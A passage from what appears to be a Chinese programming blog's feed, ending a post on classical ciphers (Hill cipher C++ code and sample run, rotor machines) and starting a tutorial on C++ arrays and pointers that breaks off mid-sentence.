class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">yuzi</span><span class="params">((len - <span class="number">1</span>) * (len - <span class="number">1</span>))</span></span>;    <span class="comment">//余子式</span></span><br><span class="line">    <span class="type">int</span> pi, pj, q;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> ai = <span class="number">0</span>; ai &lt; len; ai++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> aj = <span class="number">0</span>; aj &lt; len; aj++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> bi = <span class="number">0</span>; bi &lt; len - <span class="number">1</span>; bi++) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> bj = <span class="number">0</span>; bj &lt; len - <span class="number">1</span>; bj++) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(ai &gt; bi) pi = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">else</span> pi = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">if</span>(aj &gt; bj) pj = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">else</span> pj = <span class="number">1</span>;</span><br><span class="line">                    yuzi[bi * (len - <span class="number">1</span>) + bj] = arr[(bi + pi) * len + bj + pj];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>((ai + aj) % <span class="number">2</span> == <span class="number">0</span>) q = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> q = <span class="number">-1</span>;</span><br><span class="line">            bansui[ai * len + aj] = q * <span class="built_in">det</span>(yuzi, len - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; len;j++) &#123;</span><br><span class="line">            arr[i * len + j] = <span class="built_in">divmod</span>(bansui[i * len + j], _det);</span><br><span class="line">            inver.<span class="built_in">push_back</span>(<span class="built_in">mod</span>(arr[i * len + j]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;   <span class="comment">//转置一下输出顺序</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            <span class="type">int</span> temp = inver[i * len + j];</span><br><span class="line">            inver[i * len + j] = inver[ j * len + i];</span><br><span class="line">            inver[j * len + i] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> inver;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(string m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> y = secret_key.<span class="built_in">size</span>() / m.<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">int</span> x = m.<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; y; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; x; j ++ )</span><br><span class="line">        &#123;</span><br><span class="line">            cnt += (m[j] - <span class="string">&#x27;a&#x27;</span>) * secret_key[j * x + i];</span><br><span class="line">        &#125;</span><br><span class="line">        cnt %= <span class="number">26</span>;</span><br><span class="line">        secret_text += (cnt + <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;加密后的密文：&quot;</span> &lt;&lt; secret_text &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encode</span><span class="params">(string m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    clear_key = <span class="built_in">inverse</span>(secret_key);</span><br><span class="line">    <span class="type">int</span> y = secret_key.<span class="built_in">size</span>() / m.<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">int</span> x = m.<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; y; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; x; j ++ )</span><br><span class="line">        &#123;</span><br><span class="line">            cnt += (m[j] - <span class="string">&#x27;A&#x27;</span>) * clear_key[j * x + i];</span><br><span class="line">        &#125;</span><br><span class="line">        cnt %= <span class="number">26</span>;</span><br><span class="line">        cleartext += (cnt + <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;加密后的密文：&quot;</span> &lt;&lt; cleartext &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请选择解密还是加密，加密选1，解密选2&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; res;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入密钥,全部输入到本行&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(cin &gt;&gt; n)</span><br><span class="line">    &#123;</span><br><span class="line">        secret_key.<span class="built_in">push_back</span>(n);</span><br><span class="line">        <span class="keyword">if</span>(cin.<span class="built_in">get</span>() == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(res == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请输入明文&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cin &gt;&gt; cleartext;</span><br><span class="line">        <span class="built_in">encrypt</span>(cleartext);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(res == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请输入密文&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cin &gt;&gt; secret_text;</span><br><span class="line">        <span class="built_in">encode</span>(secret_text);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加密</span></span><br><span class="line">请选择解密还是加密，加密选<span class="number">1</span>，解密选<span class="number">2</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">请输入密钥,全部输入到本行</span><br><span class="line"><span class="number">10</span> <span class="number">5</span> <span class="number">12</span> <span class="number">0</span> <span class="number">0</span> <span class="number">3</span> <span class="number">14</span> <span class="number">21</span> <span class="number">0</span> <span class="number">0</span> <span class="number">8</span> <span class="number">9</span> <span class="number">11</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">11</span> <span class="number">8</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">3</span> <span class="number">7</span></span><br><span class="line">请输入明文</span><br><span class="line">cyber</span><br><span class="line">加密后的密文：WRTRV</span><br><span class="line"></span><br><span class="line"><span class="comment">//解密</span></span><br><span class="line">请选择解密还是加密，加密选<span class="number">1</span>，解密选<span class="number">2</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">请输入密钥,全部输入到本行</span><br><span class="line"><span class="number">10</span> <span class="number">5</span> <span class="number">12</span> <span class="number">0</span> <span class="number">0</span> <span class="number">3</span> <span class="number">14</span> <span class="number">21</span> <span class="number">0</span> <span class="number">0</span> <span class="number">8</span> <span class="number">9</span> <span class="number">11</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">11</span> <span class="number">8</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">3</span> <span class="number">7</span></span><br><span class="line">请输入密文</span><br><span class="line">WRTRV</span><br><span class="line">加密后的密文：cyber</span><br></pre></td></tr></table></figure><hr><h2 id="三、轮换密码">三、轮换密码</h2><h3 id="介绍-7">介绍</h3><p>从 19 世纪 20 年代开始，人们逐渐发明各种机械加解密设备用来处理数据的加密解密运算,起初普遍使用的设备是转轮密码机。转轮密码机是由一个用于输入的键盘和一组转轮组成,每个转轮上有<code>26</code>个字母的任意组合,转轮之间由齿轮进行连接,当一个转轮转动时,可以将一个字母转化成为另一个字母。为了使转轮更安全,人们还把几种转轮和移动齿轮结合起来,所有转轮以不同的速度转动,并且通过调整转轮上字母的位置和速度为破译设置障碍。转轮密码机原理如图 3-1 所示,它是一个三转轮密码机模型,3 个带有数字的矩形框代表 3 个转轮,从左到右分别称为慢轮子、中轮子和快轮子。转轮内部相当于一个单表代换。当按下某一键时,电信号从慢轮子的输人引脚进人,经过内部连线流经每个转轮,最后从快轮子的输出引脚输出密文。如在图 3-1(a)中,如果按下字母键 A,则一个电信号被加到慢轮子的输入引脚 24 并通过内部连线连接到慢轮子的输出引脚 24,经过中轮子的输入引脚 24 和输出引脚 24,连接到快轮子的输人引脚 18,最后从快轮子的输出引脚 18 输出密文字母 B</p><h3 id="图片">图片</h3><p><img src="https://cdn.acwing.com/media/article/image/2023/10/29/169037_17d46cc876-8.jpg" alt="8.jpg"></p><p>如果转轮机始终保持图 3-1(a)的连接状态,则按下字母键 A,输出的密文永远是字母 B,这显然是单表代换密码。转轮密码机的设计目的是通过转轮的转动来实现复杂的多表代换，从而打破明文与密文之间的固定代替关系。所以,转轮密码机在每次击键并输出密文以后,快轮子要转动一个位置,以改变中轮子与快轮子之间的对应关系。如在图 3-1(a)所示状态下,如果按下任意一个键(如 A 键),转轮密码机输出密文(如 B),然后快轮子转动一个位置,即快轮子的所有引脚向下移动一个位置,原最下边的引脚移至顶端,此时转轮密码机的状态如图 3-1(b)所示,显然,此时若再按个 A 键,则一个电信号被加到慢轮子的输入引脚 24 并通过内部连线连接到慢轮子的输出引脚 24,经过中轮子的输人引脚 24 和输出引脚 24,连接到快轮子的输出引脚 17,最后从快轮子的输出引脚 17 输出密文字母 E,显然,两次的输出结果是完全不同的,快轮子转动一圈(26 个位置),中轮子转动一个位置;中轮子转动一圈(26 个位置),慢轮子转动一个位置。因此,在加密或解密 26×26×26 个字母以后,所有转轮都恢复到初始状态。由此可知,一个有 3 个转轮的转轮密码机是一个密周期为 26×26×26=17 576 的多表代换密码机械装置。一个 5 转轮密码机的密钥周期是 265=11881 376,一般地，一个有 m 个转轮的密码机其周期是 $26^m$,所以转轮密码机是一种长周期的多表代换密码机。</p><h3 id="总结">总结</h3><p>转轮密码机的使用大大提高了密码加解密速度,同时其抗攻击性有很大的提高,在第二次世界大战中有着广泛的应用,它是密码学发展史上的一个里程碑。</p><h2 id="总结-2">总结</h2><blockquote><p>写了好久，总结懒得写了，让 AI 写的 😋</p></blockquote><p>古代密码体制的学习让我对古代的通信方式和信息安全有了更深入的了解。</p><p>古代加密方法，如古希腊战争中的隐写术，以及中国古代的藏头诗、藏尾诗、漏格诗等，都是古人为了保护信息不被敌方获取而发明的方法。这些方法虽然简单，但体现了古人的智慧和对信息安全的重视。</p><p>古代密码体制的发明和进步，反映了人类对信息安全的不断追求。同时，这些加密方法也为我们现代人提供了宝贵的启示，让我们看到了信息安全的重要性，以及在信息安全领域中不断探索和创新的精神。</p><p>学习古代密码体制，不仅让我们了解了古代的通信历史和文化，更让我们对信息安全有了更深入的认识和理解。在当今这个信息化的时代，信息安全已经成为我们生活中不可或缺的一部分，我们每个人都应该加强对信息安全的重视和保护。</p>]]></content>
    
    
    <summary type="html">古典密码大全</summary>
    
    
    
    <category term="密码学" scheme="https://nonevector.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="置换密码" scheme="https://nonevector.top/tags/%E7%BD%AE%E6%8D%A2%E5%AF%86%E7%A0%81/"/>
    
    <category term="列置换密码" scheme="https://nonevector.top/tags/%E5%88%97%E7%BD%AE%E6%8D%A2%E5%AF%86%E7%A0%81/"/>
    
    <category term="周期置换密码" scheme="https://nonevector.top/tags/%E5%91%A8%E6%9C%9F%E7%BD%AE%E6%8D%A2%E5%AF%86%E7%A0%81/"/>
    
    <category term="代换密码" scheme="https://nonevector.top/tags/%E4%BB%A3%E6%8D%A2%E5%AF%86%E7%A0%81/"/>
    
    <category term="单表代换密码" scheme="https://nonevector.top/tags/%E5%8D%95%E8%A1%A8%E4%BB%A3%E6%8D%A2%E5%AF%86%E7%A0%81/"/>
    
    <category term="多表代换密码" scheme="https://nonevector.top/tags/%E5%A4%9A%E8%A1%A8%E4%BB%A3%E6%8D%A2%E5%AF%86%E7%A0%81/"/>
    
    <category term="Vigenere密码" scheme="https://nonevector.top/tags/Vigenere%E5%AF%86%E7%A0%81/"/>
    
    <category term="Playfair密码" scheme="https://nonevector.top/tags/Playfair%E5%AF%86%E7%A0%81/"/>
    
    <category term="Hill密码" scheme="https://nonevector.top/tags/Hill%E5%AF%86%E7%A0%81/"/>
    
    <category term="轮换密码" scheme="https://nonevector.top/tags/%E8%BD%AE%E6%8D%A2%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>C++之数组篇</title>
    <link href="https://nonevector.top/posts/4.html"/>
    <id>https://nonevector.top/posts/4.html</id>
    <published>2023-10-14T07:52:58.854Z</published>
    <updated>2023-11-29T03:35:27.150Z</updated>
    
    <content type="html"><![CDATA[<p>前几天在学习密码学的时候，再看 C++源码的时候，发现 C++在函数调用数组的时候并不需要调用 <code>&amp;</code> 来指向数组地址 <s>基础还是不行</s>，留此随记提醒自己</p><h2 id="数组与指针的关系">数组与指针的关系</h2><blockquote><p>C++中数组和指针是两个十分常用且关系密切的数据结构，“数组即指针，指针即数组”的言论一直层出不穷。从本质上讲，数组和指针是不同的，数组是具有确定数量的元素，而指针只是一个标量值。但是，在某些情况下数组和指针又能相互转换。下面，将从多个角度分析数组和指针。</p></blockquote><h3 id="1-数组作为函数参数">1. 数组作为函数参数</h3><h4 id="1-1-数组元素作为函数实参">1.1 数组元素作为函数实参</h4><p>这里并没有引用数组地址，而是仅仅作为实参传入数值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">work</span><span class="params">(<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> arr[<span class="number">5</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">  <span class="type">int</span> n = <span class="number">-0x3f3f3f3f</span>; <span class="comment">// 十六进制，就是很小很小的负数</span></span><br><span class="line">  cout &lt;&lt; <span class="built_in">max</span>(arr[<span class="number">1</span>], n) &lt;&lt; endl; <span class="comment">// 此处会输出2</span></span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;仅作为实参下的arr[1]:&quot;</span> &lt;&lt; <span class="built_in">work</span>(arr[<span class="number">1</span>])&lt;&lt; endl; <span class="comment">//仅作为实参下的arr[1]:1</span></span><br><span class="line"></span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;真实的arr[1]:&quot;</span> &lt;&lt; arr[<span class="number">1</span>];<span class="comment">//真实的arr[1]:2</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="1-2-数组名作为函数实参">1.2 数组名作为函数实参</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">work</span><span class="params">(<span class="type">int</span> n[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> arr[<span class="number">5</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;开始的arr[1]:&quot;</span> &lt;&lt; arr[<span class="number">1</span>] &lt;&lt; endl; <span class="comment">// 开始的arr[1]:2</span></span><br><span class="line">  <span class="built_in">work</span>(arr);</span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;最后的arr[1]:&quot;</span> &lt;&lt; arr[<span class="number">1</span>] &lt;&lt; endl;<span class="comment">//最后的arr[1]:1</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现这里的引用<code>arr</code>（尽管名字不一样），函数引用的不仅仅是数组里面的数值，而是地址，这边牵扯到下面有管数组和指针的区别</p><h3 id="2-数组和指针互相转换">2. 数组和指针互相转换</h3><p>数组能在指定情况下转换为指针，当数组在表达式中使用时，编译器将数组名转换为一个指针常量，指向数组第一个元素的地址。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> arr[] = &#123;<span class="number">2</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">  <span class="type">int</span> *p1 = arr;</span><br><span class="line">  <span class="type">int</span> *p2 = &amp;arr[<span class="number">0</span>];</span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;p1:&quot;</span> &lt;&lt; p1 &lt;&lt; <span class="string">&quot;, value:&quot;</span> &lt;&lt; *p1 &lt;&lt; endl;           <span class="comment">// p1:0xffffcbd0, value:2</span></span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;p2:&quot;</span> &lt;&lt; p2 &lt;&lt; <span class="string">&quot;, value:&quot;</span> &lt;&lt; *p2 &lt;&lt; endl;           <span class="comment">// p2:0xffffcbd0, value:2</span></span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;arr:&quot;</span> &lt;&lt; arr &lt;&lt; <span class="string">&quot;, value:&quot;</span> &lt;&lt; arr[<span class="number">0</span>] &lt;&lt; endl;      <span class="comment">// arr:0xffffcbd0, value:2</span></span><br><span class="line"></span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;p1+2:&quot;</span>  &lt;&lt; p1+<span class="number">2</span> &lt;&lt; <span class="string">&quot;, value:&quot;</span> &lt;&lt; *(p1+<span class="number">2</span>) &lt;&lt; endl;  <span class="comment">// p1+2:0xffffcbd8, value:1</span></span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;arr+2:&quot;</span> &lt;&lt; &amp;arr[<span class="number">2</span>] &lt;&lt; <span class="string">&quot;, value:&quot;</span> &lt;&lt; arr[<span class="number">2</span>] &lt;&lt; endl;<span class="comment">// arr+2:0xffffcbd8, value:1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结论:如果令<code>int * p = arr</code>，则<code>p = arr = &amp;arr[0]</code>, <code>p+2 = arr+2 = &amp;arr[2]</code>;</p><p>但是，有两种情况下，数组名与指针不能混为一谈。</p><ul><li><p>第一种，数组作为<code>sizeof</code>操作符的参数时：</p><ul><li><p><code>sizeof</code>是一个操作符(operator)，其作用是返回一个对象或类型所占的内存字节数。</p></li><li><p><code>sizeof</code>(数组): 大小是数组的元素个数*元素类型所占字节数，与数组的类型信息相关，与地址信息无关；</p></li><li><p><code>sizeof</code>(指针): 大小固定，32 位机器全是 4 个字节，64 位机都是 8 个字节。</p></li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> arr[] = &#123;<span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>&#125;;</span><br><span class="line">    <span class="type">int</span> *p = arr;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">sizeof</span>(arr) &lt;&lt; endl;      <span class="comment">// 20 : 5*sizeof(int)</span></span><br><span class="line">    cout &lt;&lt; <span class="built_in">sizeof</span>(*arr) &lt;&lt; endl;     <span class="comment">// 4  : 第一个元素值的大小</span></span><br><span class="line">    cout &lt;&lt; <span class="built_in">sizeof</span>(&amp;arr) &lt;&lt; endl;     <span class="comment">// 8  : 第一个元素地址的大小</span></span><br><span class="line">    cout &lt;&lt; <span class="built_in">sizeof</span>(arr[<span class="number">0</span>]) &lt;&lt; endl;   <span class="comment">// 4  : 第一个元素值的大小</span></span><br><span class="line">    cout &lt;&lt; <span class="built_in">sizeof</span>(&amp;arr[<span class="number">0</span>]) &lt;&lt; endl;  <span class="comment">// 8  : 第一个元素地址的大小</span></span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="built_in">sizeof</span>(p) &lt;&lt; endl;        <span class="comment">// 8  : 指针的大小</span></span><br><span class="line">    cout &lt;&lt; <span class="built_in">sizeof</span>(*p) &lt;&lt; endl;       <span class="comment">// 4  : 指针所指元素值的大小</span></span><br><span class="line">    cout &lt;&lt; <span class="built_in">sizeof</span>(&amp;p) &lt;&lt; endl;       <span class="comment">// 8  : 指针的地址的大小</span></span><br><span class="line">    cout &lt;&lt; <span class="built_in">sizeof</span>(p[<span class="number">0</span>]) &lt;&lt; endl;     <span class="comment">// 4  : 数组第一个元素值的大小</span></span><br><span class="line">    cout &lt;&lt; <span class="built_in">sizeof</span>(&amp;p[<span class="number">0</span>]) &lt;&lt; endl;    <span class="comment">// 8  : 数组第一个元素值的地址的大小</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>第二种，数组作为单目操作符&amp;的操作数时：<ul><li>&amp;数组: 表示取数组的地址，即数组的指针；</li><li>&amp;指针: 表示取指针的地址，即指针的指针。</li></ul></li></ul><hr><h3 id="3-二维数组与指针">3. 二维数组与指针</h3><p>指针的概念其实很简单，指针难就难在与其他结构之间的牵扯，比如指针与二维数组。</p><ul><li><p>第一点，定义指向二维数组的指针：</p><p>定义二维数组 int aa[2][5]；<br>由于数组名为数组的第一个元素的地址，而二维数组 aa 的第一个元素为长度为 5 的一维数组；<br>因此，如果定义一个指针指向二维数组的话，该指针的长度也必须为 5；<br>即，int (*p)[5] = aa 或者 int (*p)[5] = &amp;aa[0], 表示长度为 5 的指针数组。</p></li><li><p>第二点，指针访问二维数组第一个元素中的值：</p><ul><li>首先，*p 表示二维数组中第一个元素对应的值，即长度为 5 的一维数组，假设为 a[5]；</li><li>其次，*p 可看成一维数组 a[5]的名，即 a[5]的第一个元素的地址；</li><li>最后，如果想取 aa[0][2]，则可用*(*p+2) 表示。</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> aa[<span class="number">2</span>][<span class="number">5</span>] = &#123;&#123;<span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>&#125;,&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;&#125;;</span><br><span class="line">    <span class="built_in">int</span> (*p)[<span class="number">5</span>] = aa;</span><br><span class="line">    cout &lt;&lt; *(*p+<span class="number">2</span>)&lt;&lt; endl;       <span class="comment">// 1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>第三点，指针访问二维数组任意一个元素的值：</p><ul><li>使用列指针：定义一个列指针 p，让它指向二维数组的第 1 个元素。<ul><li>首先，aa[0] 相当于 int a[5], 则 p=&amp;aa[0][0]相当于 p=a[0];</li><li>其次，C 语言中数组是按行优先顺序存储，而 aa[i][j]前面共有 i<em>5+j 个元素，所以该二维数组的任意 i 行 j 列元素可表示为</em>(p+i*5+j)</li></ul></li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> aa[<span class="number">2</span>][<span class="number">5</span>] = &#123;&#123;<span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>&#125;,&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;&#125;;</span><br><span class="line">    <span class="type">int</span> *p = &amp;aa[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    cout &lt;&lt; *(p+<span class="number">1</span>*<span class="number">5</span>+<span class="number">2</span>)&lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>使用行指针：定义一个行指针 p，让它指向二维数组的第 1 行。<ul><li>其中* ( *(p+i)+j)表示任意一个 i 行 j 列的元素值， <em>(p+i)可理解为取二维数组中第 i 个元素的值，即 a=int[5]，而</em>(a+j)表示一维数组 a 的第 j 个元素的值。</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> aa[<span class="number">2</span>][<span class="number">5</span>] = &#123;&#123;<span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>&#125;,&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;&#125;;</span><br><span class="line">    <span class="built_in">int</span> (*p)[<span class="number">5</span>] = aa; <span class="comment">//也可以为p=&amp;aa[0];</span></span><br><span class="line">    cout &lt;&lt; *(*(p+<span class="number">1</span>)+<span class="number">2</span>)&lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="char-类型的数组">char 类型的数组</h2><p><code>char</code>类型的数组通常用于存储字符数据。由于一个字符通常占用一个字节（即 8 